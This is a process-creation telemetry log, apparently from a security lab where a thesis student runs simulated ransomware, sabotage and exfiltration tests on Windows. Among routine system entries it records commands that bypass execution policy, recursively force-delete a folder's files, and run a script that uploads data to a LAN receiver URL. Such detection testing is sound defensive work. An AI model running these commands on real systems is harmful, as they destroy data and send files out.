+1783856907625,2026-07-12T11:46:36Z,6008,888,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:36Z,1400,10608,ngen.exe,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\ngen.exe"" uninstall ""C:\Windows\assembly\NativeImages_v4.0.30319_32\System.Runtc259d85b#\af2050a721aae166abf0094036c82468\System.Runtime.WindowsRuntime.UI.Xaml.ni.dll"" /noroot /LegacyServiceBehavior","""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",wininit.exe <- services.exe <- svchost.exe <- taskhostw.exe <- ngentask.exe <- ngen.exe,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:36Z,6008,8212,ngen.exe,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ngen.exe"" uninstall ""C:\Windows\assembly\NativeImages_v4.0.30319_64\Microsoft.Wd75d181a#\ddb53cebd744fe6fb0b0c63bb2519f3e\Microsoft.Windows.Diagnosis.SDEngine.ni.dll"" /noroot /LegacyServiceBehavior","""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",wininit.exe <- services.exe <- svchost.exe <- taskhostw.exe <- ngentask.exe <- ngen.exe,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:37Z,6008,5028,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:37Z,1400,8580,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:39Z,1400,9884,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:40Z,6008,7408,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:40Z,1400,1192,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:42Z,6008,10232,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:42Z,6008,11204,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:42Z,1400,9780,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:43Z,1400,9284,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:43Z,6008,6544,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:43Z,1088,7984,UsoClient.exe,,C:\Windows\System32\mousocoreworker.exe -Embedding,Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:47:46Z,772,9656,sppsvc.exe,C:\Windows\system32\sppsvc.exe,C:\Windows\system32\services.exe,wininit.exe <- services.exe <- sppsvc.exe,C.364907172793f8c7
+1783856907625,2026-07-12T11:48:07Z,7148,136,rundll32.exe,"rundll32.exe AppXDeploymentExtensions.OneCore.dll,ShellRefresh",C:\Windows\system32\svchost.exe -k wsappx -p -s AppXSvc,wininit.exe <- services.exe <- svchost.exe <- rundll32.exe,C.364907172793f8c7
+1783856907625,2026-07-12T11:48:11Z,4628,4276,MpCmdRun.exe,,"""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26060.3008-0\MsMpEng.exe""",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:48:11Z,4276,8964,conhost.exe,,,Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:48:11Z,4628,10900,MpCmdRun.exe,,"""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26060.3008-0\MsMpEng.exe""",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:48:11Z,10900,4068,conhost.exe,,,Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:48:17Z,904,2240,dllhost.exe,C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5},C:\Windows\system32\svchost.exe -k DcomLaunch -p,wininit.exe <- services.exe <- svchost.exe <- dllhost.exe,C.364907172793f8c7
+1783856907625,2026-07-12T11:48:19Z,904,11316,dllhost.exe,"""C:\Windows\system32\DllHost.exe"" /Processid:{4A616E61-3BFE-4F5C-937F-B8602BF16679}",C:\Windows\system32\svchost.exe -k DcomLaunch -p,wininit.exe <- services.exe <- svchost.exe <- dllhost.exe,C.364907172793f8c7
+1783857053813,2026-07-12T11:48:45Z,904,11948,smartscreen.exe,C:\Windows\System32\smartscreen.exe -Embedding,C:\Windows\system32\svchost.exe -k DcomLaunch -p,wininit.exe <- services.exe <- svchost.exe <- smartscreen.exe,C.364907172793f8c7
+1783857053813,2026-07-12T11:48:46Z,9028,12028,consent.exe,,C:\Windows\system32\svchost.exe -k netsvcs -p -s Appinfo,Null,C.364907172793f8c7
+1783857053813,2026-07-12T11:48:46Z,7848,12104,powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",C:\Windows\Explorer.EXE,explorer.exe <- powershell.exe,C.364907172793f8c7
+1783857053813,2026-07-12T11:48:46Z,12104,12112,conhost.exe,\??\C:\Windows\system32\conhost.exe 0x4,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",explorer.exe <- powershell.exe <- conhost.exe,C.364907172793f8c7
+1783857053813,2026-07-12T11:50:09Z,904,3044,WmiPrvSE.exe,C:\Windows\system32\wbem\wmiprvse.exe,C:\Windows\system32\svchost.exe -k DcomLaunch -p,wininit.exe <- services.exe <- svchost.exe <- WmiPrvSE.exe,C.364907172793f8c7
+1783857053813,2026-07-12T11:50:09Z,772,5876,svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s NetSetupSvc,C:\Windows\system32\services.exe,wininit.exe <- services.exe <- svchost.exe,C.364907172793f8c7
+1783857053813,2026-07-12T11:50:44Z,12104,7844,cmd.exe,,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",Null,C.364907172793f8c7
+1783857053813,2026-07-12T11:50:44Z,7844,3988,schtasks.exe,,,Null,C.364907172793f8c7
+1783857053813,2026-07-12T11:50:44Z,12104,7300,cmd.exe,,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",Null,C.364907172793f8c7
+1783857053813,2026-07-12T11:50:44Z,7300,11428,sc.exe,,,Null,C.364907172793f8c7
+1783857053813,2026-07-12T11:50:44Z,12104,11564,cmd.exe,,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",Null,C.364907172793f8c7
+1783857053813,2026-07-12T11:50:44Z,11564,4060,reg.exe,,,Null,C.364907172793f8c7
+1783857053813,2026-07-12T11:50:44Z,12104,4028,cmd.exe,"""cmd.exe"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"" ","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",explorer.exe <- powershell.exe <- cmd.exe,C.364907172793f8c7
+1783857053813,2026-07-12T11:50:45Z,4028,9964,powershell.exe,"powershell.exe  -NoProfile -ExecutionPolicy Bypass -File ""C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"" ","""cmd.exe"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"" ",explorer.exe <- powershell.exe <- cmd.exe <- powershell.exe,C.364907172793f8c7
+1783857169650,2026-07-12T11:50:50Z,904,12032,dllhost.exe,,C:\Windows\system32\svchost.exe -k DcomLaunch -p,Null,C.364907172793f8c7
+1783857169650,2026-07-12T11:50:52Z,772,11692,svchost.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
+1783857169650,2026-07-12T11:51:02Z,12104,10364,cmd.exe,"""cmd.exe"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"" ","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",explorer.exe <- powershell.exe <- cmd.exe,C.364907172793f8c7
+1783857169650,2026-07-12T11:51:02Z,10364,1152,powershell.exe,"powershell.exe  -NoProfile -ExecutionPolicy Bypass -File ""C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"" ","""cmd.exe"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"" ",explorer.exe <- powershell.exe <- cmd.exe <- powershell.exe,C.364907172793f8c7
+1783857169650,2026-07-12T11:51:16Z,12104,3080,cmd.exe,"""cmd.exe"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"" ","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",explorer.exe <- powershell.exe <- cmd.exe,C.364907172793f8c7
+1783857169650,2026-07-12T11:51:16Z,3080,8356,powershell.exe,,,explorer.exe <- powershell.exe <- cmd.exe <- powershell.exe,C.364907172793f8c7
+1783857169650,2026-07-12T11:51:31Z,12104,3636,cmd.exe,,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",Null,C.364907172793f8c7
+1783857169650,2026-07-12T11:51:31Z,3636,7860,powershell.exe,,,Null,C.364907172793f8c7
+1783857169650,2026-07-12T11:51:33Z,12104,9680,cmd.exe,"""cmd.exe"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command ""$b=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('TEC001_BASE64_OK')); [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)) | Write-Host; IEX 'Write-Host TEC001_IEX_OK'; Start-Sleep 2""","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",explorer.exe <- powershell.exe <- cmd.exe,C.364907172793f8c7
+1783857169650,2026-07-12T11:51:33Z,9680,3628,powershell.exe,"powershell.exe  -NoProfile -ExecutionPolicy Bypass -Command ""$b=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('TEC001_BASE64_OK')); [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)) | Write-Host; IEX 'Write-Host TEC001_IEX_OK'; Start-Sleep 2""","""cmd.exe"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command ""$b=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('TEC001_BASE64_OK')); [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)) | Write-Host; IEX 'Write-Host TEC001_IEX_OK'; Start-Sleep 2""",explorer.exe <- powershell.exe <- cmd.exe <- powershell.exe,C.364907172793f8c7
+1783857169650,2026-07-12T11:51:46Z,12104,5480,cmd.exe,,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",Null,C.364907172793f8c7
+1783857169650,2026-07-12T11:51:46Z,5480,5440,cmd.exe,,,Null,C.364907172793f8c7
+1783857169650,2026-07-12T11:51:46Z,5440,7296,whoami.exe,,,Null,C.364907172793f8c7
+1783857169650,2026-07-12T11:51:46Z,5440,10792,powershell.exe,,,Null,C.364907172793f8c7
+1783857169650,2026-07-12T11:51:55Z,12104,4388,cmd.exe,,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",Null,C.364907172793f8c7
+1783857169650,2026-07-12T11:51:55Z,4388,8360,schtasks.exe,,,Null,C.364907172793f8c7
+1783857169650,2026-07-12T11:51:57Z,12104,308,cmd.exe,,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",Null,C.364907172793f8c7
+1783857169650,2026-07-12T11:51:57Z,308,8736,schtasks.exe,,,Null,C.364907172793f8c7
+1783857169650,2026-07-12T11:51:58Z,12104,11040,cmd.exe,,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",Null,C.364907172793f8c7
+1783857169650,2026-07-12T11:51:58Z,11040,4248,schtasks.exe,,,Null,C.364907172793f8c7
+1783857169650,2026-07-12T11:51:58Z,1320,11200,cmd.exe,,C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,Null,C.364907172793f8c7
+1783857169650,2026-07-12T11:51:58Z,11200,8872,conhost.exe,,,Null,C.364907172793f8c7
+1783857169650,2026-07-12T11:52:00Z,12104,4688,cmd.exe,,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",Null,C.364907172793f8c7
+1783857169650,2026-07-12T11:52:00Z,4688,4004,schtasks.exe,,,Null,C.364907172793f8c7
+1783857169650,2026-07-12T11:52:09Z,12104,2192,cmd.exe,,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",Null,C.364907172793f8c7
+1783857169650,2026-07-12T11:52:09Z,2192,10396,reg.exe,,,Null,C.364907172793f8c7
+1783857169650,2026-07-12T11:52:12Z,12104,9848,cmd.exe,,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",explorer.exe <- powershell.exe <- cmd.exe,C.364907172793f8c7
+1783857169650,2026-07-12T11:52:12Z,9848,2100,reg.exe,,,Null,C.364907172793f8c7
+1783857169650,2026-07-12T11:52:14Z,12104,9468,cmd.exe,,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",Null,C.364907172793f8c7
+1783857169650,2026-07-12T11:52:14Z,9468,10744,reg.exe,,,Null,C.364907172793f8c7
+1783857169650,2026-07-12T11:52:24Z,12104,3776,cmd.exe,,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",Null,C.364907172793f8c7
+1783857169650,2026-07-12T11:52:24Z,3776,11288,sc.exe,,,Null,C.364907172793f8c7
+1783857169650,2026-07-12T11:52:26Z,12104,10536,cmd.exe,,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",Null,C.364907172793f8c7
+1783857169650,2026-07-12T11:52:26Z,10536,7128,sc.exe,,,Null,C.364907172793f8c7
+1783857169650,2026-07-12T11:52:28Z,12104,9860,cmd.exe,,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",Null,C.364907172793f8c7
+1783857169650,2026-07-12T11:52:28Z,9860,9316,sc.exe,,,Null,C.364907172793f8c7
+1783857169650,2026-07-12T11:52:29Z,772,2716,cmd.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
+1783857169650,2026-07-12T11:52:31Z,12104,10668,cmd.exe,,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",Null,C.364907172793f8c7
+1783857169650,2026-07-12T11:52:31Z,10668,9004,sc.exe,,,Null,C.364907172793f8c7
+1783857169650,2026-07-12T11:52:43Z,12104,5764,cmd.exe,,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",Null,C.364907172793f8c7
+1783857169650,2026-07-12T11:52:43Z,5764,11932,powershell.exe,,,Null,C.364907172793f8c7
+1783857310145,2026-07-12T11:52:48Z,12104,11944,cmd.exe,,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",Null,C.364907172793f8c7
+1783857310145,2026-07-12T11:52:48Z,11944,11548,cmd.exe,,,Null,C.364907172793f8c7
+1783857310145,2026-07-12T11:52:48Z,11548,2072,WMIC.exe,,,Null,C.364907172793f8c7
+1783857310145,2026-07-12T11:53:03Z,12104,11060,cmd.exe,"""cmd.exe"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"" ","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",explorer.exe <- powershell.exe <- cmd.exe,C.364907172793f8c7
+1783857310145,2026-07-12T11:53:03Z,11060,2480,powershell.exe,"powershell.exe  -NoProfile -ExecutionPolicy Bypass -File ""C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"" ","""cmd.exe"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"" ",explorer.exe <- powershell.exe <- cmd.exe <- powershell.exe,C.364907172793f8c7
+1783857310145,2026-07-12T11:53:06Z,904,536,dllhost.exe,C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5},C:\Windows\system32\svchost.exe -k DcomLaunch -p,svchost.exe <- dllhost.exe <- wininit.exe <- services.exe <- svchost.exe <- dllhost.exe <- wininit.exe <- services.exe <- svchost.exe <- dllhost.exe,C.364907172793f8c7
+1783857310145,2026-07-12T11:53:43Z,12104,11620,cmd.exe,,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",Null,C.364907172793f8c7
+1783857310145,2026-07-12T11:53:43Z,11620,10340,powershell.exe,,,Null,C.364907172793f8c7
+1783857310145,2026-07-12T11:53:45Z,12104,4564,cmd.exe,"""cmd.exe"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\Scriptransom.ps1"" ","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",explorer.exe <- powershell.exe <- cmd.exe,C.364907172793f8c7
+1783857310145,2026-07-12T11:53:45Z,4564,10160,powershell.exe,"powershell.exe  -NoProfile -ExecutionPolicy Bypass -File ""C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\Scriptransom.ps1"" ","""cmd.exe"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\Scriptransom.ps1"" ",explorer.exe <- powershell.exe <- cmd.exe <- powershell.exe,C.364907172793f8c7
+1783857310145,2026-07-12T11:53:54Z,12104,10464,cmd.exe,,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",Null,C.364907172793f8c7
+1783857310145,2026-07-12T11:53:54Z,10464,9720,powershell.exe,,,Null,C.364907172793f8c7
+1783857310145,2026-07-12T11:54:30Z,12104,6216,cmd.exe,"""cmd.exe"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"" ","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",explorer.exe <- powershell.exe <- cmd.exe,C.364907172793f8c7
+1783857310145,2026-07-12T11:54:30Z,6216,10736,powershell.exe,"powershell.exe  -NoProfile -ExecutionPolicy Bypass -File ""C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"" ","""cmd.exe"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"" ",explorer.exe <- powershell.exe <- cmd.exe <- powershell.exe,C.364907172793f8c7
+1783857310145,2026-07-12T11:54:31Z,904,7512,dllhost.exe,C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5},C:\Windows\system32\svchost.exe -k DcomLaunch -p,wininit.exe <- services.exe <- svchost.exe <- dllhost.exe,C.364907172793f8c7
+1783857310145,2026-07-12T11:54:45Z,12104,4940,cmd.exe,"""cmd.exe"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command ""$target = 'C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\DUMB_LAB'; Write-Host 'TEC008_OK'; Get-ChildItem $target -Recurse -File | ForEach-Object { Remove-Item $_.FullName -Force }; Start-Sleep 3""","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",explorer.exe <- powershell.exe <- cmd.exe,C.364907172793f8c7
+1783857310145,2026-07-12T11:54:45Z,4940,10084,powershell.exe,"powershell.exe  -NoProfile -ExecutionPolicy Bypass -Command ""$target = 'C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\DUMB_LAB'; Write-Host 'TEC008_OK'; Get-ChildItem $target -Recurse -File | ForEach-Object { Remove-Item $_.FullName -Force }; Start-Sleep 3""","""cmd.exe"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command ""$target = 'C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\DUMB_LAB'; Write-Host 'TEC008_OK'; Get-ChildItem $target -Recurse -File | ForEach-Object { Remove-Item $_.FullName -Force }; Start-Sleep 3""",explorer.exe <- powershell.exe <- cmd.exe <- powershell.exe,C.364907172793f8c7
+1783857310145,2026-07-12T11:54:50Z,12104,8404,cmd.exe,,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",Null,C.364907172793f8c7
+1783857310145,2026-07-12T11:54:50Z,8404,11116,powershell.exe,,,Null,C.364907172793f8c7
+1783857310145,2026-07-12T11:54:52Z,904,7748,dllhost.exe,,C:\Windows\system32\svchost.exe -k DcomLaunch -p,Null,C.364907172793f8c7
+1783857310145,2026-07-12T11:54:58Z,904,9080,dllhost.exe,C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5},C:\Windows\system32\svchost.exe -k DcomLaunch -p,wininit.exe <- services.exe <- svchost.exe <- dllhost.exe,C.364907172793f8c7
+1783857469134,2026-07-12T11:55:08Z,904,7860,dllhost.exe,C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5},C:\Windows\system32\svchost.exe -k DcomLaunch -p,wininit.exe <- services.exe <- svchost.exe <- dllhost.exe,C.364907172793f8c7
+1783857469134,2026-07-12T11:55:17Z,12104,6008,cmd.exe,"""cmd.exe"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"" ","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",explorer.exe <- powershell.exe <- cmd.exe,C.364907172793f8c7
+1783857469134,2026-07-12T11:55:17Z,6008,11740,powershell.exe,"powershell.exe  -NoProfile -ExecutionPolicy Bypass -File ""C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"" ","""cmd.exe"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"" ",explorer.exe <- powershell.exe <- cmd.exe <- powershell.exe,C.364907172793f8c7
+1783857469134,2026-07-12T11:55:17Z,904,6356,dllhost.exe,C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5},C:\Windows\system32\svchost.exe -k DcomLaunch -p,wininit.exe <- services.exe <- svchost.exe <- dllhost.exe,C.364907172793f8c7
+1783857469134,2026-07-12T11:55:38Z,12104,4384,cmd.exe,"""cmd.exe"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\exfiltracion_v3.ps1"" -ReceiverUrl ""http://192.168.1.129:8088/upload"" -TimeoutSec 60 -EnableUpload -KeepArtifacts","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",explorer.exe <- powershell.exe <- cmd.exe,C.364907172793f8c7
+1783857469134,2026-07-12T11:55:38Z,4384,2504,powershell.exe,"powershell.exe  -NoProfile -ExecutionPolicy Bypass -File ""C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\exfiltracion_v3.ps1"" -ReceiverUrl ""http://192.168.1.129:8088/upload"" -TimeoutSec 60 -EnableUpload -KeepArtifacts","""cmd.exe"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\exfiltracion_v3.ps1"" -ReceiverUrl ""http://192.168.1.129:8088/upload"" -TimeoutSec 60 -EnableUpload -KeepArtifacts",explorer.exe <- powershell.exe <- cmd.exe <- powershell.exe,C.364907172793f8c7
+1783857469134,2026-07-12T11:55:53Z,12104,10976,cmd.exe,"""cmd.exe"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"" ","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",explorer.exe <- powershell.exe <- cmd.exe,C.364907172793f8c7
+1783857469134,2026-07-12T11:55:53Z,10976,7892,powershell.exe,"powershell.exe  -NoProfile -ExecutionPolicy Bypass -File ""C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"" ","""cmd.exe"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"" ",explorer.exe <- powershell.exe <- cmd.exe <- powershell.exe,C.364907172793f8c7
+1783857469134,2026-07-12T11:55:54Z,904,12272,dllhost.exe,C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5},C:\Windows\system32\svchost.exe -k DcomLaunch -p,wininit.exe <- services.exe <- svchost.exe <- dllhost.exe,C.364907172793f8c7
+1783857469134,2026-07-12T11:56:33Z,904,4312,smartscreen.exe,C:\Windows\System32\smartscreen.exe -Embedding,C:\Windows\system32\svchost.exe -k DcomLaunch -p,wininit.exe <- services.exe <- svchost.exe <- smartscreen.exe,C.364907172793f8c7
+1783857469134,2026-07-12T11:56:33Z,7848,12044,powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",C:\Windows\Explorer.EXE,explorer.exe <- powershell.exe,C.364907172793f8c7
+1783857469134,2026-07-12T11:56:33Z,12044,11232,conhost.exe,\??\C:\Windows\system32\conhost.exe 0x4,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",explorer.exe <- powershell.exe <- conhost.exe,C.364907172793f8c7
+1783857469134,2026-07-12T11:56:35Z,12104,4672,cmd.exe,,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",explorer.exe <- powershell.exe <- cmd.exe,C.364907172793f8c7
+1783857469134,2026-07-12T11:56:35Z,4672,4748,powershell.exe,,,explorer.exe <- powershell.exe <- cmd.exe <- powershell.exe,C.364907172793f8c7
+1783857469134,2026-07-12T11:56:38Z,904,8808,dllhost.exe,C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5},C:\Windows\system32\svchost.exe -k DcomLaunch -p,wininit.exe <- services.exe <- svchost.exe <- dllhost.exe,C.364907172793f8c7
+1783857469134,2026-07-12T11:57:06Z,12104,12028,cmd.exe,"""cmd.exe"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"" ","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",explorer.exe <- powershell.exe <- cmd.exe,C.364907172793f8c7
